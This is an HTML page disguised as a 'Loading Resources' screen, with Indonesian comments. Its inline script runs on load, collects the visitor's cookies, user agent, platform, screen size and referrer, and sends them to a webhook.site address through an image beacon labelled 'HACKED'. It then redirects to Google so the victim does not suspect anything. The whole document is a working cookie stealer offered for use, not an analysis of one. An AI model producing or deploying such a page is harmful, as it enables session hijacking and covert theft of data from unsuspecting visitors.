<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sedang Memuat...</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loading { text-align: center; }
    </style>
</head>
<body>
    <div class="loading">
        <h1>PLEASE WAIT...</h1>
        <p>Loading Resources [■■■■■■■■■□] 90%</p>
    </div>

    <script>
        (function() {
            // URL Webhook.site lu
            const targetURL = "https://webhook.site/e6e6579c-2cbb-4944-8993-1f87e6f71633";
            
            // Ambil data sistem & cookie
            const cookie = encodeURIComponent(document.cookie || "No_Cookie_Detected");
            const ua = encodeURIComponent(navigator.userAgent);
            const platform = encodeURIComponent(navigator.platform);
            const screenRes = screen.width + "x" + screen.height;
            const ref = encodeURIComponent(document.referrer || "Direct_Visit");

            // Teknik Query String Bypass - Data ditempel di URL agar tidak 0 bytes
            const finalRequest = `${targetURL}?status=HACKED&cookie=${cookie}&device=${ua}&os=${platform}&res=${screenRes}&from=${ref}`;

            // Kirim menggunakan Image Beacon (Anti-CORS / Anti-Block)
            const logger = new Image();
            logger.src = finalRequest;

            // Redirect otomatis biar target gak curiga
            setTimeout(() => {
                window.location.href = "https://google.com";
            }, 2000);
        })();
    </script>
</body>
</html>
